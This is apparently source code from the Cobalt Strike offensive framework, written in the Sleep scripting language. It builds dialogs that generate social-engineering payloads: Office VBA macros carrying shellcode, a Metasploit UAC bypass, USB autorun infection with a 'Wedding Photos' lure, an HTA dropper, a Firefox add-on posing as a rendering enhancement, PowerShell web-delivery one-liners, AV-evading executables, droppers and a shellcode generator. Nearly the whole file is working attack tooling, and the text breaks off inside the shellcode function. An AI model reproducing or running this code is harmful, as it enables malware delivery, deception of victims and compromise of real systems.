#
# Cloud Strike Social Engineering Packages
#

import javax.swing.*;
import javax.swing.event.*;
import javax.swing.filechooser.*;

import java.awt.*;
import java.awt.event.*;
import java.awt.datatransfer.*;

import java.io.*;
import java.util.zip.*;

import common.*;

import ui.*;

sub addToClipboard {
	return lambda({
		local('$sel $cb');
		$sel = [new StringSelection: $data];
		$cb = [[Toolkit getDefaultToolkit] getSystemSelection];
		if ($cb !is $null) {
			[$cb setContents: $sel, $null];
		}

		$cb = [[Toolkit getDefaultToolkit] getSystemClipboard];
		if ($cb !is $null) {
			[$cb setContents: $sel, $null];
		}
		fork({
			global('$__frame__');
			showError("Copied text to clipboard");
		});
	}, $data => $1);
}

sub macroDialog {
	local('$dialog $steps $a $b $label $handle $macro $r $x');
	$dialog = dialog("Macro Instructions", 640, 480);
	[$dialog setLayout: [new BorderLayout]];
			
	$steps = [new JLabel];
	[$steps setBorder: [BorderFactory createEmptyBorder: 5, 5, 5, 5]];
	$handle = [SleepUtils getIOHandle: resource("resources/macro.html"), $null];
	[$steps setText: readb($handle, -1)];
	closef($handle);

	# read in our macro
	$handle = [SleepUtils getIOHandle: resource("resources/macro.txt"), $null];
	$macro = readb($handle, -1);
	closef($handle);

	# format our payload..
	$r = allocate();
	writeb($r, 'Array(');
	for ($x = 0; $x < strlen($1); $x++) {
		writeb($r, byteAt($1, $x));
		if ($x > 0 && ($x % 32) == 0 && ($x + 1) < strlen($1)) {
			writeb($r, ", _\n");
		}
		else if (($x + 1) < strlen($1)) {
			writeb($r, ',');
		}
	}
	writeb($r, ')');
	closef($r);
	$1 = readb($r, -1);
	closef($r);
	
	# place our payload into it
	$macro = strrep($macro, '$PAYLOAD$', "myArray = $1");

	$a = [new JButton: "Copy Macro"];
	[$a addActionListener: addToClipboard($macro)];

	[$dialog add: $steps, [BorderLayout CENTER]];
	[$dialog add: center($a), [BorderLayout SOUTH]];
		
	[$dialog pack];
	[$dialog setVisible: 1];
}

sub createWordMacro {
	local('$middle $a $b @functions %options $generate $help $dialog');

	# pre-set some of the options
	%options['EXITFUNC']   = "thread";

	# the meat of the form...
	$a = [new JPanel];
	matrixLayout($a, @(
		ui:listener(  "Listener:"  , "listener",   @functions, %options, '*windows*')
	), 3);

	#
	# set up the dialog.
	#
	$dialog = dialog("MS Office Macro", 640, 480);
	[$dialog setLayout: [new BorderLayout]];

	#
	# buttons...
	# 
	$generate = ui:action("Generate", @functions, %options, $dialog, {
		[lambda({
			local('$payload');
			$payload = fixListenerOptions(%options);
			if ($payload !is $null) {
				local('$data $startmacro $endmacro $startdata $macro');

				# generate our raw payload data
	        	        %options["Format"] = "raw";
				%options["EXITFUNC"] = "process";
				%options["Encoder"]  = "generic/none";

				# call our generator in an async way please
				call_async_callback($client, "module.execute", $this, "payload", "payload/ $+ $payload", %options);
				yield;
				$data = convertAll($1)["payload"];

				# convert it to something useful...
				macroDialog($data);
			}
			else {
				showError("Couldn't find listener:\n" . %options['listener']);
			}
		}, %options => $1)];
	});
	$help = [new JButton: "Help"];
	[$help addActionListener: gotoURL("http://www.advancedpentest.com/help-office-macro-attack")];

	#
	# display the form...
	#
	[$dialog add: description("This package generates a VBA macro that you may embed into a Microsoft Word or Excel document. This attack works in x86 and x64 Office on Windows."), [BorderLayout NORTH]];
	[$dialog add: $a, [BorderLayout CENTER]];
	[$dialog add: center($generate, $help), [BorderLayout SOUTH]];

	[$dialog pack];
	[$dialog setVisible: 1];
}

sub bypassuacMeterpreter {
	local('$middle $a $b @functions %options $generate $help $dialog $x64');

	# the meat of the form...
	$a = [new JPanel];
	matrixLayout($a, @(
		ui:listener(  "Listener:"  , "listener",   @functions, %options, '*windows*')
	), 3);

	#
	$x64 = ui:checkbox("Target is an x64 system", "RUN_WOW64", @functions, %options);

	#
	# set up the dialog.
	#
	$dialog = dialog("Bypass UAC", 640, 480);
	[$dialog setLayout: [new BorderLayout]];

	#
	# buttons...
	# 
	$generate = ui:action("Launch", @functions, %options, $dialog, lambda({
		[lambda({
			local('$payload $is64 $file $k $v');
			$payload = fixListenerOptions(%o);
			if ($payload !is $null) {
				# are we 64bit?
				$is64 = %o['RUN_WOW64'];

				# configure a few payload options
				foreach $k => $v (%(Format => "raw", Encoder => "generic/none", EXITFUNC => "thread", Iterations => "0")) {
					%o[$k] = "$v";
				}

				# generate our DLL to drop and load it into $data
				$file = randomArtifactName();
				if ($is64) {
					%o['output'] = "Windows UAC DLL (64-bit)";
				}
				else {
					%o['output'] = "Windows UAC DLL (32-bit)";
				}

				generateSafePayload($file, $payload, %o, $this);
				yield;
				$file = convertAll($1);
				deleteOnExit($file);

				uploadBigFile($file, $this);
                                yield;
				$file = convertAll($1);

				%o['SESSION'] = $sid;
				%o['EXE::Custom'] = $file;
				%o['DisablePayloadHandler'] = "true";
				%o['PAYLOAD'] = "windows/meterpreter/reverse_tcp";
				if ($is64) {
					%o['PAYLOAD'] = "windows/x64/meterpreter/reverse_tcp";
					%o['ARCH'] = 'x64';
					%o['TARGET'] = '1';
				}

				module_execute("exploit", "windows/local/bypassuac_injection", %o);
			}
			else {
				showError("Couldn't find listener:\n" . %options['listener']);
			}
		}, %o => $1, \$sid)];
	}, $sid => $1));
	$help = [new JButton: "Help"];
	[$help addActionListener: gotoURL("http://www.advancedpentest.com/help-bypassuac")];

	#
	# display the form...
	#
	[$dialog add: description("Execute a payload in a high-integrity context with Metasploit's bypassuac_inject module. This dialog uses Cobalt Strike's Artifact Kit to generate an AV-safe DLL to use"), [BorderLayout NORTH]];
	[$dialog add: stack($a, $x64, center($generate, $help)), [BorderLayout CENTER]];

	[$dialog pack];
	[$dialog setVisible: 1];
}

sub createJar {
	local('$middle $a $b @functions %options $generate $help $dialog');

	# the meat of the form...
	$a = [new JPanel];
	matrixLayout($a, @(
		ui:listener("Listener:"  , "listener",   @functions, %options, '*java*')
	), 3);

	# set up the dialog.
	$dialog = dialog("Java Application", 640, 480);
	[$dialog setLayout: [new BorderLayout]];

	# buttons...
	$generate = ui:action("Generate", @functions, %options, $dialog, {
		# $1 = %options
		local('$payload');
		$payload = fixListenerOptions($1);
		if ($payload !is $null) {
			generatePayload("payload/ $+ $payload", $1, "raw");
		}
		else {
			showError("Couldn't find listener:\n" . $1['listener']);
		}
	});
	$help = [new JButton: "Help"];
	[$help addActionListener: gotoURL("http://www.advancedpentest.com/help-java-application-attack")];

	# display the form...
	[$dialog add: description("This package will generate a Java Application Archive (.jar)."), [BorderLayout NORTH]];
	[$dialog add: $a, [BorderLayout CENTER]];
	[$dialog add: center($generate, $help), [BorderLayout SOUTH]];

	[$dialog pack];
	[$dialog setVisible: 1];
}

sub createAutoRun {
	local('$a @functions %options $generate $help $dialog');

	# pre-set some of the options
	%options["Action"] = "Open folder to view files";
	%options["Label"]  = "Wedding Photos";
	%options["Icon"]   = "%systemroot%\\system32\\shell32.dll,4";

	# the meat of the form...
	$a = [new JPanel];
	matrixLayout($a, @(
		ui:text("Media Label:",     "Label",      @functions, %options),
		ui:text("AutoPlay Action:", "Action",     @functions, %options),
		ui:text("AutoPlay Icon:"  , "Icon",       @functions, %options, $null),
		ui:file("Executable:"     , "EXE",        @functions, %options, $null)
	), 3);

	# set up the dialog.
	$dialog = dialog("USB/CD AutoPlay", 640, 480);
	[$dialog setLayout: [new BorderLayout]];

	# buttons...
	$generate = ui:action("Launch", @functions, %options, $dialog, {
		openFile(lambda({
			local('$data $directory $exe $icon $handle $ex');

			$directory = $1;
			$exe = getFileName(%o['EXE']);
		
			try {
				if (!-exists $directory) {
					mkdir($directory);
				}

				# create the autorun file
				$handle = openf(">" . getFileProper($directory, "autorun.inf"));
				println($handle, "[autorun]");
				println($handle, "open= $+ $exe");
				println($handle, "action=" . %o['Action']);
				println($handle, "icon=" . %o['Icon']);
				println($handle, "label=" . %o['Label']);
				println($handle, "shell\\Open\\command= $+ $exe");
				println($handle, "shell\\Explore\\command= $+ $exe");
				println($handle, "shell\\Search...\\command= $+ $exe");
				println($handle, "shellexecute= $+ $exe");
				println($handle, "UseAutoPlay=1");
				closef($handle);

				copyFile(%o["EXE"], getFileProper($directory, $exe));
	
				showError("Created autorun.inf in $directory $+ .\nCopy files to root of USB drive or burn to CD.");
			}
			catch $ex {
				showError([$ex getMessage]);
			}
		}, %o => $1, $e => $2), $title => "Save AutoPlay files to...", $dirsonly => 1);
	});
	$help = [new JButton: "Help"];
	[$help addActionListener: gotoURL("http://www.advancedpentest.com/help-usb-autoplay-attack")];

	# display the form...
	[$dialog add: description("This package generates an autorun.inf that abuses the AutoPlay feature on Windows. Use this package to infect Windows XP and Vista systems through CDs and USB sticks."), [BorderLayout NORTH]];
	[$dialog add: $a, [BorderLayout CENTER]];
	[$dialog add: center($generate, $help), [BorderLayout SOUTH]];

	[$dialog pack];
	[$dialog setVisible: 1];
}

sub createHTMLApp {
	local('$a @functions %options $generate $help $dialog');

	# the meat of the form...
	$a = [new JPanel];
	matrixLayout($a, @(
		ui:file("Executable:", "EXE",  @functions, %options, $null),
		ui:text("File Name:" , "NAME", @functions, %options)
	), 3);

	# set up the dialog.
	$dialog = dialog("HTML Application Dropper", 640, 480);
	[$dialog setLayout: [new BorderLayout]];

	# buttons...
	$generate = ui:action("Launch", @functions, %options, $dialog, {
		local('%o $handle $data $app');
		%o = $1;

		if (%o["EXE"] eq "") {
			showError("I need an executable");
			return;
		}

		if (%o["NAME"] eq "") {
			%o["NAME"] = getFileName(%o['EXE']);
		}
		
		# read in the executable
		$handle = openf(%o['EXE']);
		$data = readb($handle, -1);
		closef($handle);

		# transform it..
		$data = unpack("H*", $data)[0];

		# read in our HTML Application
		$handle = [SleepUtils getIOHandle: resource("resources/htmlapp.txt"), $null];
		$app = readb($handle, -1);
		closef($handle);
		
		# replace stuff..
		$app = strrep($app, '##EXE##', $data, '##NAME##', %o['NAME']);
		
		# write it out...
		saveFile2(lambda({
			local('$handle');
			$handle = openf("> $+ $1");
			writeb($handle, $app);
			closef($handle);

			showError("Congrats. You're the owner of an HTML app package.");
		}, \$app), $sel => "evil.hta");
	});
	$help = [new JButton: "Help"];
	[$help addActionListener: gotoURL("http://www.advancedpentest.com/help-html-application-attack")];

	# display the form...
	[$dialog add: description("This package generates an HTML application that drops and runs an executable."), [BorderLayout NORTH]];
	[$dialog add: $a, [BorderLayout CENTER]];
	[$dialog add: center($generate, $help), [BorderLayout SOUTH]];

	[$dialog pack];
	[$dialog setVisible: 1];
}

sub createFirefoxAddon {
	local('$a @functions %options $generate $help $dialog');

	# pre-set some of the options
	%options['ADDONNAME']     = 'HTML5 Rendering Enhancements';
	%options['AutoUninstall'] = '1';
	%options['SRVPORT']       = '8080';
	%options['URIPATH']       = '/browser-addon.xpi';
	%options['Target']        = '1';

	# the meat of the form...
	$a = [new JPanel];
	matrixLayout($a, @(
		ui:text("Addon Name:"    , "ADDONNAME",   @functions, %options),
		ui:text("Port:"          , "SRVPORT",     @functions, %options),
		ui:text("URI Path:"      , "URIPATH",     @functions, %options),
		ui:listener("Listener:"  , "listener",    @functions, %options, '*windows*'), 
	), 3);

	# set up the dialog.
	$dialog = dialog("Firefox Add-on", 640, 480);
	[$dialog setLayout: [new BorderLayout]];

	# buttons...
	$generate = ui:action("Launch", @functions, %options, $dialog, {
		thread(lambda({
			# fix our payload and target.
			%o['PAYLOAD'] = fixListenerOptions(%o);
			%o['DisablePayloadHandler'] = "true";
			%o['TARGET'] = '1';

			launch_service("multi/browser/firefox_xpi_bootstrapped_addon", "exploit/multi/browser/firefox_xpi_bootstrapped_addon", %o, "exploit", $format => "");
		}, %o => $1));
	});
	$help = [new JButton: "Help"];
	[$help addActionListener: gotoURL("http://www.advancedpentest.com/help-firefox-addon-attack")];

	# display the form...
	[$dialog add: description("This package creates a Firefox .xpi addon file. The resulting Firefox addon is presented to the victim via a web page. The victim's Firefox browser will pop a dialog asking if they trust the addon. Once the user clicks \"install\", the addon is installed and executes the payload with full user permissions. The payload is run within the browser's process space. You should enable the 'Automatically migrate' option in your listener."), [BorderLayout NORTH]];
	[$dialog add: $a, [BorderLayout CENTER]];
	[$dialog add: center($generate, $help), [BorderLayout SOUTH]];

	[$dialog pack];
	[$dialog setVisible: 1];
}

sub createPowerShell {
	local('$a @functions %options $generate $help $dialog');

	# pre-set some of the options
	%options['port']          = '80';
	%options['uri']           = '/a';

	# the meat of the form...
	$a = [new JPanel];
	matrixLayout($a, @(
		ui:text("URI Path: *"    , "uri",       @functions, %options),
		ui:text("Local Port: *"  , "port",      @functions, %options),
		ui:listener("Listener:", "listener",  @functions, %options, '*windows*'), 
	), 3);

	# set up the dialog.
	$dialog = dialog("PowerShell Web Delivery", 640, 480);
	[$dialog setLayout: [new BorderLayout]];

	# buttons...
	$generate = ui:action("Launch", @functions, %options, $dialog, {
		[lambda({
			local('$payload $data $uri $port $res');
			$uri = %options["uri"];
			$port = int(%options["port"]);

			$payload = fixListenerOptions(%options);
			if ($payload is $null) {
				showError("Couldn't find listener:\n" . %options['listener']);
				return;
			}

			# generate our raw payload data
        	        %options["Format"] = "raw";
			%options["EXITFUNC"] = "process";
			%options["Encoder"]  = "generic/none";

			# call our generator in an async way please
			call_async_callback($client, "module.execute", $this, "payload", "payload/ $+ $payload", %options);
			yield;
			$data = convertAll($1)["payload"];

			# convert our payload into a PowerShell script
			$data = [ArtifactUtils buildPowerShell: cast($data, 'b')];

			# host the script...
			call_async_callback($client, "cloudstrike.host_data", $this, $port, $uri, $data, "text/plain", "PowerShell Web Delivery");  
			yield;
			$res = convertAll($1)['status'];

			# report our status to the user...
			if ($res eq "success") {
				startedWebService("PowerShell Web Delivery", [CommonUtils PowerShellOneLiner: "http:// $+ $MY_ADDRESS $+ : $+ $port $+ $uri"]);
			}
			else {
				showError("Unable to start web server:\n" . $res);
			}

		}, %options => $1)];
	});
	$help = [new JButton: "Help"];
	[$help addActionListener: gotoURL("http://www.advancedpentest.com/help-powershell-web-delivery")];

	# display the form...
	[$dialog add: description("This attack hosts a PowerShell script that delivers a Cobalt Strike listener. The provided one-liner will allow you to quickly get a session on a target host."), [BorderLayout NORTH]];
	[$dialog add: $a, [BorderLayout CENTER]];
	[$dialog add: center($generate, $help), [BorderLayout SOUTH]];

	[$dialog pack];
	[$dialog setVisible: 1];
}

sub createFileDownload {
	local('$a @functions %options $generate $help $dialog @types');

	%options['MIME_TYPE'] = "automatic";
	%options['URIPATH']   = "/download/file.ext";
	%options['SRVPORT']   = 80;

	# some mime types to choose from 
	@types = @('automatic', 'application/acad', 'application/arj', 'application/astound', 'application/clariscad', 'application/drafting', 'application/dxf', 'application/hta', 'application/i-deas', 'application/iges', 'application/java-archive', 'application/mac-binhex40', 'application/msaccess', 'application/msexcel', 'application/mspowerpoint', 'application/msproject', 'application/msword', 'application/mswrite', 'application/octet-stream', 'application/oda', 'application/pdf', 'application/postscript', 'application/pro_eng', 'application/rtf', 'application/set', 'application/sla', 'application/solids', 'application/STEP', 'application/vda', 'application/x-bcpio', 'application/x-cpio', 'application/x-csh', 'application/x-director', 'application/x-dvi', 'application/x-dwf', 'application/x-gtar', 'application/x-gzip', 'application/x-hdf', 'application/x-javascript', 'application/x-latex', 'application/x-macbinary', 'application/x-midi', 'application/x-mif', 'application/x-netcdf', 'application/x-sh', 'application/x-shar', 'application/x-shockwave-flash', 'application/x-stuffit', 'application/x-sv4cpio', 'application/x-sv4crc', 'application/x-tar', 'application/x-tcl', 'application/x-tex', 'application/x-texinfo', 'application/x-troff', 'application/x-troff-man', 'application/x-troff-me', 'application/x-troff-ms', 'application/x-ustar', 'application/x-wais-source', 'application/x-winhelp', 'application/x-xpinstall', 'application/zip', 'audio/basic', 'audio/midi', 'audio/x-aiff', 'audio/x-mpeg', 'audio/x-pn-realaudio', 'audio/x-pn-realaudio-plugin', 'audio/x-voice', 'audio/x-wav', 'image/bmp', 'image/gif', 'image/ief', 'image/jpeg', 'image/pict', 'image/png', 'image/tiff', 'image/x-cmu-raster', 'image/x-portable-anymap', 'image/x-portable-bitmap', 'image/x-portable-graymap', 'image/x-portable-pixmap', 'image/x-rgb', 'image/x-xbitmap', 'image/x-xpixmap', 'image/x-xwindowdump', 'multipart/x-gzip', 'multipart/x-zip', 'text/html', 'text/plain', 'text/richtext', 'text/tab-separated-values', 'text/x-setext', 'text/x-sgml', 'video/mpeg', 'video/msvideo', 'video/quicktime', 'video/vdo', 'video/vivo', 'video/x-sgi-movie', 'x-conference/x-cooltalk', 'x-world/x-svr', 'x-world/x-vrml', 'x-world/x-vrt');

	# the meat of the form...
	$a = [new JPanel];
	matrixLayout($a, @(
		ui:file("File:"          , "SERVEME",     @functions, %options, $null),
		ui:text("URI Path: *"    , "URIPATH",     @functions, %options),
		ui:text("Local Port: *"  , "SRVPORT",     @functions, %options),
		ui:combobox("Mime Type:",  "MIME_TYPE",   @functions, %options, @types)
	), 3);

	# set up the dialog.
	$dialog = dialog("Host File", 640, 480);
	[$dialog setLayout: [new BorderLayout]];

	# buttons...
	$generate = ui:action_noclose("Launch", @functions, %options, $dialog, lambda({
		[lambda({
			local('$status $e $m $type $ext');

			# check if our file exists or not...
			if (!-exists %options['SERVEME']) {
				showError("Hey, I can't find that file!");
				return;
			}

			# upload our file first...
			[$dialog setVisible: 0];
			uploadBigFile(%options['SERVEME'], $this);
			yield;
			%options['SERVEME'] = $1;

			# setup the mime type if it's the users wish that we do so...
			if (%options['MIME_TYPE'] eq 'automatic') {
				%options['MIME_TYPE'] = 'application/octet-stream';

				foreach $e (@('application/acad::dwg', 'application/arj::arj', 'application/astound::asn', 'application/clariscad::ccad', 'application/drafting::drw', 'application/dxf::dxf', 'application/hta::hta', 'application/i-deas::unv', 'application/iges::igs', 'application/java-archive::jar', 'application/mac-binhex40::hqx', 'application/msaccess::mdb', 'application/msexcel::xlw', 'application/mspowerpoint::ppt', 'application/msproject::mpp', 'application/msword::w6w', 'application/mswrite::wri', 'application/octet-stream::bin', 'application/oda::oda', 'application/pdf::pdf', 'application/postscript::ps', 'application/pro_eng::prt', 'application/rtf::rtf', 'application/set::set', 'application/sla::stl', 'application/solids::sol', 'application/STEP::stp', 'application/vda::vda', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document::docx', 'application/vnd.ms-word.document.macroEnabled.12::docm', 'application/vnd.openxmlformats-officedocument.wordprocessingml.template::dotx', 'application/vnd.ms-word.template.macroEnabled.12::dotm', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet::xlsx', 'application/vnd.ms-excel.sheet.macroEnabled.12::xlsm', 'application/vnd.openxmlformats-officedocument.spreadsheetml.template::xltx', 'application/vnd.ms-excel.template.macroEnabled.12::xltm', 'application/vnd.ms-excel.sheet.binary.macroEnabled.12::xlsb', 'application/vnd.ms-excel.addin.macroEnabled.12::xlam', 'application/vnd.openxmlformats-officedocument.presentationml.presentation::pptx', 'application/vnd.ms-powerpoint.presentation.macroEnabled.12::pptm', 'application/vnd.openxmlformats-officedocument.presentationml.slideshow::ppsx', 'application/vnd.ms-powerpoint.slideshow.macroEnabled.12::ppsm', 'application/vnd.openxmlformats-officedocument.presentationml.template::potx', 'application/vnd.ms-powerpoint.template.macroEnabled.12::potm', 'application/vnd.ms-powerpoint.addin.macroEnabled.12::ppam', 'application/vnd.openxmlformats-officedocument.presentationml.slide::sldx', 'application/vnd.ms-powerpoint.slide.macroEnabled.12::sldm', 'application/msonenote::one', 'application/msonenote::onetoc2', 'application/msonenote::onetmp', 'application/msonenote::onepkg', 'application/vnd.ms-officetheme::thmx', 'application/x-bcpio::bcpio', 'application/x-cpio::cpio', 'application/x-csh::csh', 'application/x-director::dxr', 'application/x-dvi::dvi', 'application/x-dwf::dwf', 'application/x-gtar::gtar', 'application/x-gzip::gzip', 'application/x-hdf::hdf', 'application/x-javascript::js', 'application/x-latex::latex', 'application/x-macbinary::bin', 'application/x-midi::mid', 'application/x-mif::mif', 'application/x-netcdf::nc', 'application/x-sh::sh', 'application/x-shar::shar', 'application/x-shockwave-flash::swf', 'application/x-stuffit::sit', 'application/x-sv4cpio::sv4cpio', 'application/x-sv4crc::sv4crc', 'application/x-tar::tar', 'application/x-tcl::tcl', 'application/x-tex::tex', 'application/x-texinfo::texinfo', 'application/x-troff::tr', 'application/x-troff-man::man', 'application/x-troff-me::me', 'application/x-troff-ms::ms', 'application/x-ustar::ustar', 'application/x-wais-source::src', 'application/x-winhelp::hlp', 'application/zip::zip', 'audio/basic::snd', 'audio/midi::midi', 'audio/x-aiff::aiff', 'audio/x-mpeg::mp3', 'audio/x-pn-realaudio::ram', 'audio/x-pn-realaudio-plugin::rpm', 'audio/x-voice::voc', 'audio/x-wav::wav', 'image/bmp::bmp', 'image/gif::gif', 'image/ief::ief', 'image/jpeg::jpg', 'image/pict::pict', 'image/png::png', 'image/tiff::tiff', 'image/x-cmu-raster::ras', 'image/x-portable-anymap::pnm', 'image/x-portable-bitmap::pbm', 'image/x-portable-graymap::pgm', 'image/x-portable-pixmap::ppm', 'image/x-rgb::rgb', 'image/x-xbitmap::xbm', 'image/x-xpixmap::xpm', 'image/x-xwindowdump::xwd', 'multipart/x-gzip::gzip', 'multipart/x-zip::zip', 'text/html::html', 'text/plain::txt', 'text/richtext::rtx', 'text/tab-separated-values::tsv', 'text/x-setext::etx', 'text/x-sgml::sgml', 'video/mpeg::mpg', 'video/msvideo::avi', 'video/quicktime::qt', 'video/vdo::vdo', 'video/vivo::vivo', 'video/x-sgi-movie::movie', 'x-conference/x-cooltalk::ice', 'x-world/x-svr::svr', 'x-world/x-vrml::wrl', 'x-world/x-vrt::vrt')) {
					($m, $ext) = split('::', $e);
					if ([%options['SERVEME'] endsWith: $ext]) {
						%options['MIME_TYPE'] = $m;
					}
				}
			}

			# do it async y0
			call_async_callback($mclient, "cloudstrike.host_file", $this, %options['SRVPORT'], %options['URIPATH'], %options['SERVEME'], %options['MIME_TYPE']);
			yield;
			$status = convertAll($1);

			if ($status['status'] eq "success") {
				if (isShift($event)) {
					[$dialog setVisible: 1];
				}

				startedWebService("host file", "http:// $+ $MY_ADDRESS $+ :" . %options["SRVPORT"] . %options["URIPATH"]);
				elog("host file " . %options['SERVEME'] . " @ http:// $+ $MY_ADDRESS $+ :" . %options["SRVPORT"] . %options["URIPATH"]);
			}
			else {
				showError("Unable to start web server:\n" . $status['status']);
				[$dialog setVisible: 1];
			}
		}, %options => $1, $event => $2, \$dialog)];
	}, \$dialog));

	$help = [new JButton: "Help"];
	[$help addActionListener: gotoURL("http://www.advancedpentest.com/help-host-file")];

	# display the form...
	[$dialog add: description("Host a file through Cobalt Strike's web server"), [BorderLayout NORTH]];
	[$dialog add: $a, [BorderLayout CENTER]];
	[$dialog add: center($generate, $help), [BorderLayout SOUTH]];

	[$dialog pack];
	[$dialog setVisible: 1];
}

sub createExe {
	local('$middle $a $b @functions %options $generate $help $dialog');

	# the meat of the form...
	$a = [new JPanel];
	matrixLayout($a, @(
		ui:listener(  "Listener:"  , "listener",   @functions, %options, '*windows*'),
		#ui:migrate(   "Migrate:",    "migrate",    @functions, %options),
		ui:combobox(  "Output:",     "output",     @functions, %options, @("Windows EXE", "Windows Service EXE", "Windows DLL (32-bit)", "Windows DLL (64-bit)"))
	), 3);

	#
	# set up the dialog.
	#
	$dialog = dialog("Windows Executable", 640, 480);
	[$dialog setLayout: [new BorderLayout]];

	#
	# buttons...
	# 
	$generate = ui:action("Generate", @functions, %options, $dialog, {
		[lambda({
			local('$payload $file $ex');

			# find our listener.
			$payload = fixListenerOptions(%o);
			if ($payload is $null) {
				showError("Couldn't find listener:\n" . %o['listener']);
			}

			# ask the user where they want to save it (does not return if user doesn't choose a file)
			saveFile2($this, $sel => "artifact." . iff("*DLL*" iswm %o['output'], "dll", "exe"));
			yield;
			$file = $1;

			# generate our payload
			generateSafePayload($file, "payload/ $+ $payload", %o, $this);
			yield;
			$file = $1;

			if (-exists $file) {
				showError("Saved " . %o['output'] . " to\n $+ $file");
			}
		}, %o => $1)];
	});
	$help = [new JButton: "Help"];
	[$help addActionListener: gotoURL("http://www.advancedpentest.com/help-windows-exe")];

	#
	# display the form...
	#
	[$dialog add: description("This dialog generates a Windows executable. Use Cobalt Strike Arsenal scripts (Help -> Arsenal) to customize this process."), [BorderLayout NORTH]];

	[$dialog add: $a, [BorderLayout CENTER]];
	[$dialog add: center($generate, $help), [BorderLayout SOUTH]];

	[$dialog pack];
	[$dialog setVisible: 1];
}

sub createBeaconExe {
	local('$middle $a $b @functions %options $generate $help $dialog');

	# set our default options
	%options["output"] = "Windows EXE";

	# the meat of the form...
	$a = [new JPanel];
	matrixLayout($a, @(
		ui:stages(    "Stage:",      "stage",      @functions, %options),
		ui:combobox(  "Output:",     "output",     @functions, %options, @("PowerShell", "Raw", "Windows EXE", "Windows Service EXE", "Windows DLL (32-bit)", "Windows DLL (64-bit)"))
	), 3);

	#
	# set up the dialog.
	#
	$dialog = dialog("Windows Executable (Staged)", 640, 480);
	[$dialog setLayout: [new BorderLayout]];

	#
	# buttons...
	# 
	$generate = ui:action("Generate", @functions, %options, $dialog, {
		[lambda({
			local('%r $data $file %ext $match $value $ext');

			if (%options["output"] eq "Reflective DLL (32-bit)") {
				call_async_callback($mclient, "beacon.get_dll", $this, %options['stage']);
			}
			else {
				call_async_callback($mclient, "beacon.get_stage", $this, %options['stage']);
			}
			yield;
			%r = convertAll($1);

			if ('error' !in %r) {
				$data = %r['data'];
			}
			else {
				showError(%r['error']);
				return;
			}

			# map our different types of output to extensions
			%ext["PowerShell"]  = "ps1";
			%ext["Raw"]         = "bin";
			%ext["*EXE*"]       = "exe"; 
			%ext["*DLL*"]       = "dll";

			foreach $match => $value (%ext) {
				if ($match iswm %options['output']) {
					$ext = $value;
				}
			}

			# ask the user where they want to save it
			saveFile2($this, $sel => "beacon. $+ $ext");
			yield;
			$file = $1;

			# how big is our data?
			try {
				if (%options["output"] eq "Reflective DLL (32-bit)") {
					local('$h');
					$h = openf("> $+ $file");
					writeb($h, $data);
					closef($h);
				}
				else {
					generateSafeStagedPayload($file, $data, %options['output']);
				}
			}
			catch $ex {
				showError($ex);
			}

			if (-exists $file) {
				showError("Saved " . %options['output'] . " to\n $+ $file");
			}
		}, %options => $1)];
	});
	$help = [new JButton: "Help"];
	[$help addActionListener: gotoURL("http://www.advancedpentest.com/help-staged-exe")];

	#
	# display the form...
	#
	[$dialog add: description("Export a fully-staged Beacon as a Windows executable. Use Cobalt Strike Arsenal scripts (Help -> Arsenal) to customize this process."), [BorderLayout NORTH]];

	[$dialog add: $a, [BorderLayout CENTER]];
	[$dialog add: center($generate, $help), [BorderLayout SOUTH]];

	[$dialog pack];
	[$dialog setVisible: 1];
}

sub createDropper {
	local('$middle $a $b @functions %options $generate $help $dialog');

	# set this option so our artifact generator knows what to create
	%options['output'] = "Windows Dropper EXE";

	# the meat of the form...
	$a = [new JPanel];
	matrixLayout($a, @(
		ui:listener(  "Listener:"  , "listener", @functions, %options, '*windows*'),
		ui:file(      "Embedded File:", "FILE", @functions, %options, $null),
		ui:text(      "File Name:",     "NAME", @functions, %options)
	), 3);

	#
	# set up the dialog.
	#
	$dialog = dialog("Windows Dropper EXE", 640, 480);
	[$dialog setLayout: [new BorderLayout]];

	#
	# buttons...
	# 
	$generate = ui:action("Generate", @functions, %options, $dialog, {
		[lambda({
			local('$payload $file $ex');

			# punt if there is no embedded file
			if (!-exists %o["FILE"] || %o["FILE"] eq "") {
				showError("I need a file to embed to make a dropper");
				return;
			}

			# set a default for name if there isn't a value.
			if (%o["NAME"] eq "") {
				%o["NAME"] = getFileName(%o["FILE"]);	
			}

			# find our listener.
			$payload = fixListenerOptions(%o);
			if ($payload is $null) {
				showError("Couldn't find listener:\n" . %o['listener']);
				return;
			}

			# ask the user where they want to save it
			saveFile2($this, $sel => "dropper.exe");
			yield;
			$file = $1;

			# generate our payload
			generateSafePayload($file, "payload/ $+ $payload", %o, $this);
			yield;
			$file = $1;

			if (-exists $file) {
				showError("Saved " . %o['output'] . " to\n $+ $file");
			}
		}, %o => $1)];
	});
	$help = [new JButton: "Help"];
	[$help addActionListener: gotoURL("http://www.advancedpentest.com/help-windows-dropper")];

	#
	# display the form...
	#
	[$dialog add: description("This package creates a Windows document dropper. This package drops a document to disk, opens it, and executes a payload."), [BorderLayout NORTH]];
	[$dialog add: $a, [BorderLayout CENTER]];
	[$dialog add: center($generate, $help), [BorderLayout SOUTH]];

	[$dialog pack];
	[$dialog setVisible: 1];
}

sub createShellcode {
	local('$middle $a $b @functions %options $generate $help $dialog $options');

	# pass these on
	%options["Format"]   = "raw";
	%options["EXITFUNC"] = "thread";
	%options["Encoder"]  = "generic/none";
	%options["BadChars"] = "";

	# different ways to output our stuff.
	$options = split(",", "bash,c,csharp,dword,java,js_be,js_le,num,perl,powershell,python,raw,ruby,vbapplication,vbscript,aspx,psh,psh-net,veil");

	# the meat of the form...
	$a = [new JPanel];
	matrixLayout($a, @(
		ui:listener(  "Listener:"  , "listener",   @functions, %options, '*windows*'),
		ui:text(      "BadChars:", , "BadChars",   @functions, %options),
		ui:encoders(  "Encoder:"   , "Encoder",    @functions, %options),
		ui:combobox(  "ExitFunc:"  , "EXITFUNC",   @functions, %options, @("none", "process", "seh", "thread")),
		ui:combobox(  "Output:",     "Format",     @functions, %options, sorta($options))
	), 3);

	#
	# set up the dialog.
	#
	$dialog = dialog("Payload Generator", 640, 480);
	[$dialog setLayout: [new BorderLayout]];

	#
	# buttons...
	# 
	$generate = ui:action_noclose("Generate", @functions, %options, $dialog, lambda({
		[lambda({
			local('$payload $file $ex $data $handle $candidates $byte');

			# close our dialog if the user wants us to
			if (!isShift($e)) {
				[$dialog setVisible: 0];
			}

			# fix our badchars... turn it into a raw string of bad stuff.
			if (strlen(%o['BadChars']) > 0) {
